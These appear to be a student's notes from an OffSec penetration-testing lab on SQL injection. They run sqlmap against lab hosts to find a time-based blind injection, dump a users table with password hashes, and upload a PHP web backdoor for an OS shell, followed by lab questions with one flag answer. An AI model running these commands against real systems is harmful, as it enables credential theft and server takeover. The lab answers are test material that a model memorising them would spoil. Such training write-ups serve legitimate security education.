# Automating the Attack

Running sqlmap to quickly find SQL injection points
>``` shell
>kali@kali:~$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
>
># ========== Expected Result ==========
>        ___
>       __H__
> ___ ___[,]_____ ___ ___  {1.6.4#stable}
>|_ -| . [)]     | .'| . |
>|___|_  [,]_|_|_|__,|  _|
>      |_|V...       |_|   https://sqlmap.org
>
>...
>[*] starting @ 02:14:54 PM /2022-05-16/
>
>[14:14:54] [INFO] resuming back-end DBMS 'mysql'
>[14:14:54] [INFO] testing connection to the target URL
>got a 302 redirect to 'http://192.168.50.16:80/login1.php?msg=2'. Do you want to follow? [Y/n]
>you have not declared cookie(s), while server wants to set its own ('PHPSESSID=fbf1f5fa5fc...a7266cba36'). Do you want to use those [Y/n]
>sqlmap resumed the following injection point(s) from stored session:
>---
>Parameter: user (GET)
>    Type: time-based blind
>    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
>    Payload: user=1' AND (SELECT 1582 FROM (SELECT(SLEEP(5)))dTzB) AND 'hiPB'='hiPB
>---
>[14:14:57] [INFO] the back-end DBMS is MySQL
>web server operating system: Linux Debian
>web application technology: PHP, PHP 7.3.33, Apache 2.4.52
>back-end DBMS: MySQL >= 5.0.12
>[14:14:57] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.50.16'
>
>[*] ending @ 02:14:57 PM /2022-05-16/
># =====================================
>```

Running sqlmap to Dump Users Credentials Table
>``` shell
>kali@kali:~$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
>
># ========== Expected Result ==========
>...
>
>[*] starting @ 02:23:49 PM /2022-05-16/
>
>[14:23:49] [INFO] resuming back-end DBMS 'mysql'
>[14:23:49] [INFO] testing connection to the target URL
>got a 302 redirect to 'http://192.168.50.16:80/login1.php?msg=2'. Do you want to follow? [Y/n]
>you have not declared cookie(s), while server wants to set its own ('PHPSESSID=b7c9c962b85...c6c7205dd1'). Do you want to use those [Y/n]
>sqlmap resumed the following injection point(s) from stored session:
>---
>Parameter: user (GET)
>    Type: time-based blind
>    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
>    Payload: user=1' AND (SELECT 1582 FROM (SELECT(SLEEP(5)))dTzB) AND 'hiPB'='hiPB
>---
>[14:23:52] [INFO] the back-end DBMS is MySQL
>web server operating system: Linux Debian
>web application technology: PHP, Apache 2.4.52, PHP 7.3.33
>back-end DBMS: MySQL >= 5.0.12
>[14:23:52] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
>[14:23:52] [INFO] fetching current database
>[02:23:52 PM] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
>do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]
>[14:25:26] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
>[14:25:26] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
>
>[14:25:47] [INFO] adjusting time delay to 2 seconds due to good response times
>offsec
>[14:27:01] [INFO] fetching tables for database: 'offsec'
>[14:27:01] [INFO] fetching number of tables for database 'offsec'
>
>[02:27:01 PM] [INFO] retrieved: 2
>[02:27:11 PM] [INFO] retrieved: customers
>[02:29:25 PM] [INFO] retrieved: users
>[14:30:38] [INFO] fetching columns for table 'users' in database 'offsec'
>[02:30:38 PM] [INFO] retrieved: 4
>[02:30:44 PM] [INFO] retrieved: id
>[02:31:14 PM] [INFO] retrieved: username
>[02:33:02 PM] [INFO] retrieved: password
>[02:35:09 PM] [INFO] retrieved: description
>[14:37:56] [INFO] fetching entries for table 'users' in database 'offsec'
>[14:37:56] [INFO] fetching number of entries for table 'users' in database 'offsec'
>[02:37:56 PM] [INFO] retrieved: 4
>[02:38:02 PM] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
>[14:38:24] [INFO] adjusting time delay to 1 second due to good response times
>this is the admin
>[02:40:54 PM] [INFO] retrieved: 1
>[02:41:02 PM] [INFO] retrieved: 21232f297a57a5a743894a0e4a801fc3
>[02:46:34 PM] [INFO] retrieved: admin
>[02:47:15 PM] [INFO] retrieved: try harder
>[02:48:44 PM] [INFO] retrieved: 2
>[02:48:54 PM] [INFO] retrieved: f9664ea1803311b35f
>...
># =====================================
>```

Intercepting the POST request with Burp
>``` shell
>POST /search.php HTTP/1.1
>Host: 192.168.50.19
>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
>Accept-Language: en-US,en;q=0.5
>Accept-Encoding: gzip, deflate
>Content-Type: application/x-www-form-urlencoded
>Content-Length: 9
>Origin: http://192.168.50.19
>Connection: close
>Referer: http://192.168.50.19/search.php
>Cookie: PHPSESSID=vchu1sfs34oosl52l7pb1kag7d
>Upgrade-Insecure-Requests: 1
>
>item=test
>```

Running sqlmap with os-shell
>``` shell
>kali@kali:~$ sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
>
># ========== Expected Result ==========
>...
>[*] starting @ 02:20:47 PM /2022-05-19/
>
>[14:20:47] [INFO] parsing HTTP request from 'post'
>[14:20:47] [INFO] resuming back-end DBMS 'mysql'
>[14:20:47] [INFO] testing connection to the target URL
>sqlmap resumed the following injection point(s) from stored session:
>---
>Parameter: item (POST)
>...
>---
>[14:20:48] [INFO] the back-end DBMS is MySQL
>web server operating system: Linux Ubuntu
>web application technology: Apache 2.4.52
>back-end DBMS: MySQL >= 5.6
>[14:20:48] [INFO] going to use a web backdoor for command prompt
>[14:20:48] [INFO] fingerprinting the back-end DBMS operating system
>[14:20:48] [INFO] the back-end DBMS operating system is Linux
>which web application language does the web server support?
>[1] ASP
>[2] ASPX
>[3] JSP
>[4] PHP (default)
>> 4
>[14:20:49] [INFO] using '/var/www/html/tmp' as web server document root
>[14:20:49] [INFO] retrieved web server absolute paths: '/var/www/html/search.php'
>[14:20:49] [INFO] trying to upload the file stager on '/var/www/html/tmp/' via LIMIT 'LINES TERMINATED BY' method
>[14:20:50] [WARNING] unable to upload the file stager on '/var/www/html/tmp/'
>[14:20:50] [INFO] trying to upload the file stager on '/var/www/html/tmp/' via UNION method
>[14:20:50] [WARNING] expect junk characters inside the file as a leftover from UNION query
>[14:20:50] [INFO] the remote file '/var/www/html/tmp/tmpuqgek.php' is larger (713 B) than the local file '/tmp/sqlmapxkydllxb82218/tmp3d64iosz' (709B)
>[14:20:51] [INFO] the file stager has been successfully uploaded on '/var/www/html/tmp/' - http://192.168.50.19:80/tmp/tmpuqgek.php
>[14:20:51] [INFO] the backdoor has been successfully uploaded on '/var/www/html/tmp/' - http://192.168.50.19:80/tmp/tmpbetmz.php
>[14:20:51] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
># =====================================
>
>os-shell> id
>
># ========== Expected Result ==========
>do you want to retrieve the command standard output? [Y/n/a] y
>command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
># =====================================
>
>os-shell> pwd
>
># ========== Expected Result ==========
>do you want to retrieve the command standard output? [Y/n/a] y
>command standard output: '/var/www/html/tmp'
># =====================================
>```

Lab 1 - Connect to the MSSQL VM 1 and enable xp_cmdshell as showcased in this Learning Module. Which MSSQL configuration option needs to be enabled before xp_cmdshell can be turned on?
>``` shell
>
>```
>show advanced options

Lab 2 - Connect to the MySQL VM 2 and repeat the steps illustrated in this section to manually exploit the UNION-based SQLi. Once you have obtained a webshell, gather the flag that is located in the same tmp folder.
>``` shell
>
>```
>OS{aa0e6764fe73c03af9bde071ee5d7cc8}

Lab 3 - Connect to the MySQL VM 2 and automate the SQL injection discovery via sqlmap as shown in this section. Then dump the users table by abusing the time-based blind SQLi and find the flag that is stored in one of the table's records.
>``` shell
>
>```
>

Lab 4 - Capstone Lab: Enumerate the Learning Module Exercise - VM #1 and exploit the SQLi vulnerability to get the flag.
>``` shell
>
>```
>

Lab 5 - Capstone Lab: Enumerate the Learning Module Exercise - VM #2 and exploit the SQLi vulnerability to get the flag.
>``` shell
>
>```
>

Lab 6 - Capstone Lab: Enumerate the Learning Module Exercise - VM #3 and exploit the SQLi vulnerability to get the flag.
>``` shell
>
>```
>

Lab 7 - Capstone Lab: Enumerate the Learning Module Exercise - VM #4 and exploit the SQLi vulnerability to get the flag.
>``` shell
>
>```
>
